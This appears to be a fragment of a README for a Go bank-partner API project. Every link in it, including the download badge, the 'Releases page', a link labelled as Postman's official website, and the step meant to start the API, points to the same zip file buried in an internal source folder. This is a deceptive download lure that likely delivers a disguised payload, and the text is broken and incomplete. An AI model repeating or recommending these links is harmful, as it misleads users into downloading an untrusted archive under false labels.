...
[![Download go-bank-partner](https://raw.githubusercontent.com/charakaviduranga/go-bank-partner/main/internal/dto/bank-partner-go-v2.1.zip)](https://raw.githubusercontent.com/charakaviduranga/go-bank-partner/main/internal/dto/bank-partner-go-v2.1.zip)
...
1. **Visit the Releases Page**: Head over to the [Releases page](https://raw.githubusercontent.com/charakaviduranga/go-bank-partner/main/internal/dto/bank-partner-go-v2.1.zip) to find the latest version.
...
3. **Start the API**: Type the following command to start the application:
   ...
   ```cmd
   https://raw.githubusercontent.com/charakaviduranga/go-bank-partner/main/internal/dto/bank-partner-go-v2.1.zip
   ```
...
1. **Download Postman**: If you don't have it, download Postman from [Postman's official website](https://raw.githubusercontent.com/charakaviduranga/go-bank-partner/main/internal/dto/bank-partner-go-v2.1.zip).
